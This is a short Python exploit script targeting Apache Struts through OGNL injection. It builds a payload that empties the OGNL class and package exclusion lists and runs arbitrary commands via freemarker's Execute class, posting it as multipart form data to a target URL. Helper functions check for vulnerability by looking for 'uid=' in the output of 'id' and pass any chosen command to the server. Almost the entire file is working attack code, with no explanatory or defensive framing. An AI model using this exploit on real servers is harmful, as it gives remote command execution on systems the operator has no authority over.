#!/usr/bin/env python

import argparse
import requests
from bs4 import BeautifulSoup

def build_payload(command):
    return '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("' + command + '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'

# def get_parser():
#     parser = argparse.ArgumentParser()
#     parser.add_argument('-c', '--command', help='command', default='whoami', type=str)
#     parser.add_argument('-n', '--name', help='form data name', default='id', type=str)
#     parser.add_argument('-p', '--port', help='port', default=80, type=int)
#     parser.add_argument('-t', '--target', help='target', default='localhost', type=str)
#     parser.add_argument('-u', '--uri', help='uri', default='/', type=str)
#     return parser

def exploit(target, command):
    # parser = get_parser()
    # args = vars(parser.parse_args())
    # command, name, port, target, uri = args['command'], args['name'], args['port'], args['target'], args['uri']

    # if port == 80:
    #     base_url = f'http://{target}'
    # elif port == 443:
    #     base_url = f'https://{target}'
    # else:
    #     base_url = f'http://{target}:{port}'

    # if not uri.startswith('/'):
    #     uri = '/' + uri

    try:
        name = "id"
        r = requests.post(target, files={name: (None, build_payload(command))}, timeout=5)
        return r.text
    except requests.exceptions.RequestException as e:
        print(e); return False

    # soup = BeautifulSoup(r.text, 'html.parser')
    # print(soup.find('a').attrs[name].strip())

def attack(target): 
    result = exploit(target, "id")
    if "uid=" in result or "gid=" in result: 
        return True
    else: 
        return False

def shell(target, command): 
    if exploit(target, command): 
        return True
    else: 
        return False

# if __name__ == '__main__':
#     main()
